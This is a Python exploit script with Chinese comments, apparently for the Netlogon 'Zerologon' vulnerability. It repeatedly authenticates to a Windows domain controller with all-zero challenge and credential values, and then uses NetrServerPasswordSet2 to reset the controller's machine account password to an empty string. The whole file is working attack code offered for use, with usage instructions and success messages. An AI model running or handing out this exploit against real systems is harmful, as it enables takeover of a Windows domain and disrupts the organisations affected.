#!/usr/bin/env python3

try:
    from impacket.dcerpc.v5 import nrpc, epm
except:
    os.system("pip install -r requirements.txt")
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto
from impacket.dcerpc.v5.ndr import NDRCALL

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call
from Cryptodome.Cipher import DES, AES, ARC4
from struct import pack, unpack

# 多次尝试后放弃爆破。如果有漏洞，平均尝试256次。
MAX_ATTEMPTS = 2000 # 误报率: 0.04%

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def fail(msg):
  print(msg, file=sys.stderr)
  print('无效的参数或网络问题！', file=sys.stderr)
  sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
  # 连接到DC的Netlogon服务。
  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
  rpc_con.connect()
  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

  # 使用全零challenge和证书。
  plaintext = b'\x00' * 8
  ciphertext = b'\x00' * 8

  # Windows 10客户端观察到的标准标志(包括AES)，只有签名/印章标志被禁用。
  flags = 0x212fffff

  # 发送challenge和证书请求包。
  serverChallengeResp = nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
  serverChallenge = serverChallengeResp['ServerChallenge']
  try:
    server_auth = nrpc.hNetrServerAuthenticate3(
      rpc_con, dc_handle + '\x00', target_computer+"$\x00", nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
      target_computer + '\x00', ciphertext, flags
    )

    
    # worked!
    assert server_auth['ErrorCode'] == 0
    print()
    server_auth.dump()
    print("server challenge", serverChallenge)

    try:
      IV=b'\x00'*16
      authenticator = nrpc.NETLOGON_AUTHENTICATOR()
      authenticator['Credential'] = ciphertext #authenticatorCred
      authenticator['Timestamp'] = b"\x00" * 4 #0 # 时间戳
      
      request = nrpc.NetrServerPasswordSet2()
      request['PrimaryName'] = NULL
      request['AccountName'] = target_computer + '$\x00'
      request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
      request['ComputerName'] = target_computer + '\x00'
      request["Authenticator"] = authenticator
      request["ClearNewPassword"] = b"\x00"*516
      resp = rpc_con.request(request)
      resp.dump()
    
    except Exception as e:
      print(e)
    return rpc_con

  except nrpc.DCERPCSessionError as ex:
    # 失败应该是由于状态拒绝访问的错误，攻击可能不会起作用。
    if ex.get_error_code() == 0xc0000022:
      return None
    else:
      fail(f'来自DC的意外错误代码: {ex.get_error_code()}.')
  except BaseException as ex:
    fail(f'意外错误: {ex}.')


def perform_attack(dc_handle, dc_ip, target_computer):
  # 一直验证直到成功。预期平均尝试次数:256。
  print('执行身份验证的尝试...')
  rpc_con = None
  for attempt in range(0, MAX_ATTEMPTS):  
    rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
    
    if rpc_con == None:
      print('=', end='', flush=True)
    else:
      break

  if rpc_con:
    print('\n成功!DC机器密码一设置为空字符串。')
  else:
    print('\n攻击失败!漏洞可能已修补。')
    sys.exit(1)


if __name__ == '__main__':
  if not (3 <= len(sys.argv) <= 4):
    print('用法: set_empty_pw.py <dc-name> <dc-ip>\n')
    print('作用：将DC账户密码设置为空字符串。')
    print('注意：dc-name应该是域控制器的(NetBIOS)计算机名。')
    sys.exit(1)
  else:
    [_, dc_name, dc_ip] = sys.argv

    dc_name = dc_name.rstrip('$')
    perform_attack('\\\\' + dc_name, dc_ip, dc_name)

